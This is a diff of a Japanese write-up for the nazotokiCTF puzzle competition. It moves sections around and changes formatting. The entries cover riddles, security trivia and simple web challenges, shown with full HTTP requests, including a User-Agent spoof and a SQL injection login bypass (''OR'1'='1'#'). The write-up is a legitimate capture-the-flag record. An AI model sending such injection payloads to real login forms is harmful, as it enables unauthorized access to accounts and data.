@@ -6,9 +6,255 @@
 ### Welcome
 フラグの説明を兼ねたチュートリアルモンダイ。
 
-例で示された通り`ナゾトキ`で正解。
+例で示された通り**ナゾトキ**で正解。
 
-## Misc
+## Riddle - Fire elements
+### おひつじ座
+> あなたが目指しているものの間を読め
+
+一番時間がかかった問題がこれ。
+
+プロローグに「セキュリティエンジニアを目指すただの一般人だ。」と書いてるので長時間こっちを気にしてたが関係なかった。
+
+「セキュリティ業界の星に、俺はなる！！」より星に着目。
+
+イントロダクションの画像に★が２つあり、その間を縦読みすると「**ハンドル**」。
+
+### しし座
+
+カタカナが散らばった画像が与えられる。
+
+ルールのページを見ると以下のように書かれている。
+- 燃えるゴミは捨ててください
+- ペットボトル
+
+「モエルゴミ」「ペットボトル」の文字をすべてを削除すると「**チーター**」が残る。
+
+### いて座
+
+穴埋め問題。
+```text
+〇〇ス〇＝〇ウ
+〇〇ス〇＝〇ウ
+〇〇ス　＝〇ウ
+〇〇ス　＝〇ウ
+```
+
+東西南北を当てはめると答えが現れる。
+```text
+イースト＝トウ
+ウエスト＝ザイ
+サウス　＝ナン
+ノース　＝ボク
+```
+
+**イースト**が正解。
+
+
+
+## Knowledge - Earth elements
+### おうし座
+> 2021年に行われたコンピュータウイルス「emotet」のテイクダウン作成の名前を日本語で言うと？
+
+「テントウムシ作戦」なので「**テントウ**」が正解。
+
+### おとめ座
+> Webアプリケーションのセキュリティ分野の研究・ガイドラインの作成・脆弱性診断ツールの開発・イベント開催などの  
+> 活動をしているオープンソースソフトウェアコミュニティの名称の読み方をカタカナ4文字で答えよ。
+
+「OWASP」なので「**オワスプ**」が正解。
+
+### やぎ座
+> ある数 x を数 b のべき乗bᵖとして表した場合のpのこと。logとも呼ばれるこの数を日本語で何というか？カタカナ4文字で答えよ。  
+
+「対数」なので「**タイスウ**」が正解。
+
+
+## Web - Air elements
+### ふたご座
+画面にパスワードが書かれているのでその通りSubmitすると、パスワードが違いますと言われる。
+
+HTTPリクエストを見ると、入力したものは`dummyPassword`パラメータに入っており、それと別に`realPassword`パラメータの存在に気づく。
+
+```http
+GET /check.php?dummyPassword=dioskouroi&realPassword=dummyPassword HTTP/2
+Host: gemini.ctf.nazotoki.tech
+Sec-Ch-Ua: "-Not.A/Brand";v="8", "Chromium";v="102"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://gemini.ctf.nazotoki.tech/
+Accept-Encoding: gzip, deflate
+Accept-Language: ja,en-US;q=0.9,en;q=0.8
+
+```
+
+`realPassword`パラメータにも同じ値を入れてあげると、リダイレクトののち正解が返ってくる。
+
+```http
+GET /check.php?dummyPassword=dioskouroi&realPassword=dioskouroi HTTP/2
+Host: gemini.ctf.nazotoki.tech
+Sec-Ch-Ua: "-Not.A/Brand";v="8", "Chromium";v="102"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://gemini.ctf.nazotoki.tech/
+Accept-Encoding: gzip, deflate
+Accept-Language: ja,en-US;q=0.9,en;q=0.8
+
+```
+
+nazotokiCTF{**ナイーブ**}
+
+### てんびん座
+指定されたページにアクセスすると以下のメッセージが表示される。
+
+> フラグは`stardustChrome`という特殊なブラウザでしか閲覧できません。
+
+HTTPリクエストのUser-Agentを書き換えてアクセスしてみる。
+
+```http
+GET / HTTP/2
+Host: libra.ctf.nazotoki.tech
+Sec-Ch-Ua: "-Not.A/Brand";v="8", "Chromium";v="102"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Upgrade-Insecure-Requests: 1
+User-Agent: stardustChrome
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate
+Accept-Language: ja,en-US;q=0.9,en;q=0.8
+
+```
+
+```http
+HTTP/2 200 OK
+Date: Sun, 17 Jul 2022 04:31:01 GMT
+Content-Type: text/html; charset=UTF-8
+Content-Length: 1520
+Server: Apache/2.4.38 (Debian)
+X-Powered-By: PHP/7.4.8
+Vary: Accept-Encoding
+
+<!DOCTYPE html>
+<html lang="Ja">
+  <head>
+    <!-- Document Meta-->
+    <meta charset="utf-8"/>
+    <!-- Stylesheets-->
+    <link href="assets/css/vendor.min.css" rel="stylesheet"/>
+    <link href="assets/css/style.css" rel="stylesheet"/>
+    <!--
+    Document Title
+    =============================================
+    -->
+    <title>Libra</title>
+  </head>
+  <body class="bg-gray">
+  <section id="libra">
+        <div class="container">
+          <div class="row clearfix">
+            <div class="col-12 col-md-12 offset-md-1 col-lg-8 offset-lg-1">
+            <h2 class="heading--title">Libra</h2>
+            <h6>リクエストヘッダー情報</h6>
+            <p>
+                フラグは<code>stardustChrome</code>という特殊なブラウザでしか閲覧できません。
+            </p>
+            <p>
+                X-Forwarded-For:113.150.97.62<br>X-Forwarded-Proto:https<br>X-Forwarded-Port:443<br>Host:libra.ctf.nazotoki.tech<br>X-Amzn-Trace-Id:Root=1-62d39085-3f00904712e95a0a7426701e<br>sec-ch-ua:&quot;-Not.A/Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;102&quot;<br>sec-ch-ua-mobile:?0<br>sec-ch-ua-platform:&quot;Windows&quot;<br>upgrade-insecure-requests:1<br><br />確かにstardustChromeを使ってるね。フラグをどうぞ！ <br />nazotokiCTF{<code>クローン</code>} <br />
+            </p>
+            <a href="/" onclick="window.location.reload();">再読み込み</a>
+            </div>
+          </div>
+        </div>
+      </section>
+  </body>
+</html>
+```
+
+nazotokiCTF{**クローン**}
+
+### みずがめ座
+社員ナンバーとパスワードを入力するフォームが表示される。
+
+適当なIDとパスワードだと当然エラーになる。
+
+プロローグのページをよく読むと「イントロダクション」に社員ナンバー`99`の記載がある。
+
+社員ナンバー「99」とパスワード「password」でログインに成功。
+
+```http
+POST / HTTP/2
+Host: aquarius.ctf.nazotoki.tech
+Content-Length: 45
+Cache-Control: max-age=0
+Sec-Ch-Ua: "-Not.A/Brand";v="8", "Chromium";v="102"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Upgrade-Insecure-Requests: 1
+Origin: https://aquarius.ctf.nazotoki.tech
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://aquarius.ctf.nazotoki.tech/
+Accept-Encoding: gzip, deflate
+Accept-Language: ja,en-US;q=0.9,en;q=0.8
+
+inputNumber=99&inputPassword=password&search=
+```
+
+フラグのヒントはナンバー9999に載っており、パスワードは普通には見れないらしい。
+
+社員ナンバー「9999」と、試しにSQLインジェクションでログインできるか確認してみる。
+```http
+POST / HTTP/2
+Host: aquarius.ctf.nazotoki.tech
+Content-Length: 66
+Cache-Control: max-age=0
+Sec-Ch-Ua: "-Not.A/Brand";v="8", "Chromium";v="102"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Upgrade-Insecure-Requests: 1
+Origin: https://aquarius.ctf.nazotoki.tech
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://aquarius.ctf.nazotoki.tech/
+Accept-Encoding: gzip, deflate
+Accept-Language: ja,en-US;q=0.9,en;q=0.8
+
+inputNumber=9999&inputPassword=%27OR%271%27%3D%271%27%23++&search=
+```
+
+レスポンスに「nazotokiCTF{`この候補者の苗字`}」と表示される。
+
+改めてプロローグを読むと「**タカハシ**」が正解であることがわかる。
+
+## Misc - Water elements
 ### かに座
 仲間はずれを探せ
 
@@ -18,7 +264,7 @@ bpp形式の画像であることがわかるが、ファイル名「f0525aafa09
 
 テキストに直接フラグが記載されている。
 
-`nazotokiCTF{イイワケ}`
+nazotokiCTF{**イイワケ**}
 
 ### さそり座
 犬の写真scorpio.jpgが与えられる。
@@ -94,252 +340,7 @@ The password for the zip is "fomalhaut".
 
 得られたパスワード`formalhaut`でzipを解凍すると画像が得られる。
 
-画像は立体視で文字が埋め込まれており、`ケッパク`が正解。
-
-
-## Web
-### ふたご座
-画面にパスワードが書かれているのでその通りSubmitすると、パスワードが違いますと言われる。
-
-HTTPリクエストを見ると、入力したものは`dummyPassword`パラメータに入っており、それと別に`realPassword`パラメータの存在に気づく。
-
-```http
-GET /check.php?dummyPassword=dioskouroi&realPassword=dummyPassword HTTP/2
-Host: gemini.ctf.nazotoki.tech
-Sec-Ch-Ua: "-Not.A/Brand";v="8", "Chromium";v="102"
-Sec-Ch-Ua-Mobile: ?0
-Sec-Ch-Ua-Platform: "Windows"
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Sec-Fetch-Site: same-origin
-Sec-Fetch-Mode: navigate
-Sec-Fetch-User: ?1
-Sec-Fetch-Dest: document
-Referer: https://gemini.ctf.nazotoki.tech/
-Accept-Encoding: gzip, deflate
-Accept-Language: ja,en-US;q=0.9,en;q=0.8
-
-```
-
-`realPassword`パラメータにも同じ値を入れてあげると、リダイレクトののち正解が返ってくる。
-
-```
-GET /check.php?dummyPassword=dioskouroi&realPassword=dioskouroi HTTP/2
-Host: gemini.ctf.nazotoki.tech
-Sec-Ch-Ua: "-Not.A/Brand";v="8", "Chromium";v="102"
-Sec-Ch-Ua-Mobile: ?0
-Sec-Ch-Ua-Platform: "Windows"
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Sec-Fetch-Site: same-origin
-Sec-Fetch-Mode: navigate
-Sec-Fetch-User: ?1
-Sec-Fetch-Dest: document
-Referer: https://gemini.ctf.nazotoki.tech/
-Accept-Encoding: gzip, deflate
-Accept-Language: ja,en-US;q=0.9,en;q=0.8
-
-```
-
-nazotokiCTF{`ナイーブ`}
-
-### てんびん座
-指定されたページにアクセスすると以下のメッセージが表示される。
-
-> フラグは`stardustChrome`という特殊なブラウザでしか閲覧できません。
-
-HTTPリクエストのUser-Agentを書き換えてアクセスしてみる。
-
-```http
-GET / HTTP/2
-Host: libra.ctf.nazotoki.tech
-Sec-Ch-Ua: "-Not.A/Brand";v="8", "Chromium";v="102"
-Sec-Ch-Ua-Mobile: ?0
-Sec-Ch-Ua-Platform: "Windows"
-Upgrade-Insecure-Requests: 1
-User-Agent: stardustChrome
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Sec-Fetch-Site: none
-Sec-Fetch-Mode: navigate
-Sec-Fetch-User: ?1
-Sec-Fetch-Dest: document
-Accept-Encoding: gzip, deflate
-Accept-Language: ja,en-US;q=0.9,en;q=0.8
-
-```
-
-```http
-HTTP/2 200 OK
-Date: Sun, 17 Jul 2022 04:31:01 GMT
-Content-Type: text/html; charset=UTF-8
-Content-Length: 1520
-Server: Apache/2.4.38 (Debian)
-X-Powered-By: PHP/7.4.8
-Vary: Accept-Encoding
-
-<!DOCTYPE html>
-<html lang="Ja">
-  <head>
-    <!-- Document Meta-->
-    <meta charset="utf-8"/>
-    <!-- Stylesheets-->
-    <link href="assets/css/vendor.min.css" rel="stylesheet"/>
-    <link href="assets/css/style.css" rel="stylesheet"/>
-    <!--
-    Document Title
-    =============================================
-    -->
-    <title>Libra</title>
-  </head>
-  <body class="bg-gray">
-  <section id="libra">
-        <div class="container">
-          <div class="row clearfix">
-            <div class="col-12 col-md-12 offset-md-1 col-lg-8 offset-lg-1">
-            <h2 class="heading--title">Libra</h2>
-            <h6>リクエストヘッダー情報</h6>
-            <p>
-                フラグは<code>stardustChrome</code>という特殊なブラウザでしか閲覧できません。
-            </p>
-            <p>
-                X-Forwarded-For:113.150.97.62<br>X-Forwarded-Proto:https<br>X-Forwarded-Port:443<br>Host:libra.ctf.nazotoki.tech<br>X-Amzn-Trace-Id:Root=1-62d39085-3f00904712e95a0a7426701e<br>sec-ch-ua:&quot;-Not.A/Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;102&quot;<br>sec-ch-ua-mobile:?0<br>sec-ch-ua-platform:&quot;Windows&quot;<br>upgrade-insecure-requests:1<br><br />確かにstardustChromeを使ってるね。フラグをどうぞ！ <br />nazotokiCTF{<code>クローン</code>} <br />
-            </p>
-            <a href="/" onclick="window.location.reload();">再読み込み</a>
-            </div>
-          </div>
-        </div>
-      </section>
-  </body>
-</html>
-```
-
-nazotokiCTF{クローン}
-
-### みずがめ座
-社員ナンバーとパスワードを入力するフォームが表示される。
-
-適当なIDとパスワードだと当然エラーになる。
-
-プロローグのページをよく読むと「イントロダクション」に社員ナンバー`99`の記載がある。
-
-社員ナンバー「99」とパスワード「password」でログインに成功。
-
-```http
-POST / HTTP/2
-Host: aquarius.ctf.nazotoki.tech
-Content-Length: 45
-Cache-Control: max-age=0
-Sec-Ch-Ua: "-Not.A/Brand";v="8", "Chromium";v="102"
-Sec-Ch-Ua-Mobile: ?0
-Sec-Ch-Ua-Platform: "Windows"
-Upgrade-Insecure-Requests: 1
-Origin: https://aquarius.ctf.nazotoki.tech
-Content-Type: application/x-www-form-urlencoded
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Sec-Fetch-Site: same-origin
-Sec-Fetch-Mode: navigate
-Sec-Fetch-User: ?1
-Sec-Fetch-Dest: document
-Referer: https://aquarius.ctf.nazotoki.tech/
-Accept-Encoding: gzip, deflate
-Accept-Language: ja,en-US;q=0.9,en;q=0.8
-
-inputNumber=99&inputPassword=password&search=
-```
-
-フラグのヒントはナンバー9999に載っており、パスワードは普通には見れないらしい。
-
-社員ナンバー「9999」と、試しにSQLインジェクションでログインできるか確認してみる。
-```http
-POST / HTTP/2
-Host: aquarius.ctf.nazotoki.tech
-Content-Length: 66
-Cache-Control: max-age=0
-Sec-Ch-Ua: "-Not.A/Brand";v="8", "Chromium";v="102"
-Sec-Ch-Ua-Mobile: ?0
-Sec-Ch-Ua-Platform: "Windows"
-Upgrade-Insecure-Requests: 1
-Origin: https://aquarius.ctf.nazotoki.tech
-Content-Type: application/x-www-form-urlencoded
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Sec-Fetch-Site: same-origin
-Sec-Fetch-Mode: navigate
-Sec-Fetch-User: ?1
-Sec-Fetch-Dest: document
-Referer: https://aquarius.ctf.nazotoki.tech/
-Accept-Encoding: gzip, deflate
-Accept-Language: ja,en-US;q=0.9,en;q=0.8
-
-inputNumber=9999&inputPassword=%27OR%271%27%3D%271%27%23++&search=
-```
-
-レスポンスに「nazotokiCTF{`この候補者の苗字`}」と表示される。
-
-改めてプロローグを読むと`タカハシ`が正解であることがわかる。
-
-
-## Knowledge
-### おうし座
-> 2021年に行われたコンピュータウイルス「emotet」のテイクダウン作成の名前を日本語で言うと？
-
-「テントウムシ作戦」なので「`テントウ`」が正解。
-
-### おとめ座
-> Webアプリケーションのセキュリティ分野の研究・ガイドラインの作成・脆弱性診断ツールの開発・イベント開催などの  
-> 活動をしているオープンソースソフトウェアコミュニティの名称の読み方をカタカナ4文字で答えよ。
-
-「OWASP」なので「`オワスプ`」が正解。
-
-### やぎ座
-> ある数 x を数 b のべき乗bᵖとして表した場合のpのこと。logとも呼ばれるこの数を日本語で何というか？カタカナ4文字で答えよ。  
-
-「対数」なので「`タイスウ`」が正解。
-
-
-## Riddle
-### おひつじ座
-あなたが目指しているものの間を読め
-
-プロローグに「セキュリティエンジニアを目指すただの一般人だ。」と書いてるので長時間こっちを気にしてたが関係なかった。
-
-「セキュリティ業界の星に、俺はなる！！」より星に着目。
-
-イントロダクションの画像に★が２つあり、その間を縦読みすると「`ハンドル`」。
-
-### しし座
-
-カタカナが散らばった画像が与えられる。
-
-ルールのページを見ると以下のように書かれている。
-- 燃えるゴミは捨ててください
-- ペットボトル
-
-「モエルゴミ」「ペットボトル」の文字をすべてを削除すると「`チーター`」が残る。
-
-### いて座
-
-穴埋め問題。
-```text
-〇〇ス〇＝ウ
-〇〇ス〇＝ウ
-〇〇ス　＝ウ
-〇〇ス　＝ウ
-```
-
-東西南北を当てはめると答えが現れる。
-```text
-イースト＝トウ
-ウエスト＝ザイ
-サウス　＝ナン
-ノース　＝ボク
-```
-
-`イースト`が正解。
-
+画像は立体視で文字が埋め込まれており「**ケッパク**」が正解。
 
 ## 2nd Challenge
 ### へびつかい座
@@ -376,7 +377,7 @@ function hatenaClick(){
 }
 ```
 
-アクセス数が一億回を超えるとアラートが出るらしい。「`ポラリス`」で正解。
+アクセス数が一億回を超えるとアラートが出るらしい。「**ポラリス**」で正解。
 
 ## Last Challenge
 ### 最終問題
@@ -392,12 +393,14 @@ Last Challengeの問題にハートの列がある。
 「すたーだすと」では通らなかったので「stardust」に変更するとログインに成功。
 
 ログイン後のページに答えが載っている。
-> 最終問題のフラグは nazotokiCTF{`オールト`} です。
+> 最終問題のフラグは nazotokiCTF{**オールト**} です。
 
 ## Congratulations!!
 ### Thank you
 
 アンケートに答えるとフラグが得られる。
-> nazotokiCTF{`アリガト`}
-
+> nazotokiCTF{**アリガト**}
+ 
+## results
+![nazotokiCTF_results](https://user-images.githubusercontent.com/42441861/179447852-70da6f07-6b0d-422e-a8d2-ddf4491b23b2.png)
 
